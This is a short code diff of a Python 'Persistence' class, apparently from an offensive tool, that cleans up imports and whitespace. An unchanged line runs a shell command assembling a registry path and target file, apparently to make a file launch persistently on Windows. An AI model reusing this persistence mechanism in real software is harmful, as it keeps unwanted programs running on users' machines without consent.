@@ -5,11 +5,9 @@
 import os
 import subprocess
 import shutil
-import string
 import random
-from winreg import ConnectRegistry, OpenKey
 
-from core.splendenteError import Error, ERROR_FILE_NOT_FOUND, ERROR_FILE_EMPTY, EXIT_SUCCESS
+from core.splendente_error import ERROR_FILE_NOT_FOUND, ERROR_FILE_EMPTY, EXIT_SUCCESS
 
 #--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#
 
@@ -54,10 +52,8 @@ class Persistence:
                                                 break
 
                                 subprocess.run(self.targetRegisterPath + targetRegisterVersion + self.targetRegisterType + targetFile, shell=True, timeout=3)
-                 
                             else:
                                 return ERROR_FILE_EMPTY
                         else:
-                            return ERROR_FILE_NOT_FOUND    
-                            
+                            return ERROR_FILE_NOT_FOUND               
             return EXIT_SUCCESS
